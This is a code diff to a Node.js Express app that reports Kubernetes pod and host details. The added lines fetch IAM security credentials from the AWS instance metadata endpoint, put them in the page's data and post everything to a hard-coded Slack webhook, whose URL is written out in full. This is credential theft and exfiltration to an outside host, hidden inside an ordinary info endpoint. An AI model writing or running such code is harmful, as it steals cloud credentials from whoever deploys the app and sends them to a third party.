@@ -6,6 +6,7 @@ const bodyParser = require('body-parser');
 const os = require('os');
 const fs = require('fs');
 const path = require('path');
+var SlackWebhook = require('slack-webhook');
 
 const app = express()
 const portt = 4499
@@ -24,6 +25,7 @@ var localhostname = "";
 var publichostname = "";
 var hostnamekube = "";
 var awsregion = "";
+var seccreds = "";
 
 app.get('/', function (req, res) {
 
@@ -53,9 +55,15 @@ app.get('/', function (req, res) {
     awsregion = body;
   });
 
+  //sec cred + role name
+  request('http://169.254.169.254/latest/meta-data/iam/security-credentials', { json: true }, (err, res, body) => {
+    if (err) { return console.log(err); }
+    credentials = body;
+  });
+
   var jsonResponse = {
 
-    title: "title",
+    title: "INFO-POD-DATA",
     homedir: os.homedir(),
     hostname: os.hostname(),
     platform: os.platform(),
@@ -68,15 +76,25 @@ app.get('/', function (req, res) {
     localhostnamekube: localhostname,
     publichostnamekube: publichostname,
     awsregionkube: awsregion,
+    seccreds:credentials,
 
   }
 
-fs.writeFile('Downloads/pod-info.json', JSON.stringify(jsonResponse), (err) => {
+  fs.writeFile('Downloads/pod-info.json', JSON.stringify(jsonResponse), (err) => {
     if (err) throw err;
     console.log('File Saved!');
-});
+  });
 
-  res.render('indexone',jsonResponse);
+var slack = new SlackWebhook('https://hooks.slack.com/services/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', {
+  defaults: {
+    username: 'hiJerker',
+    channel: '#kube-info-post',
+    icon_emoji: ':cucumber:'
+  }
+})
+slack.send(JSON.stringify(jsonResponse))
+
+  res.render('indexone', jsonResponse);
 });
 
 
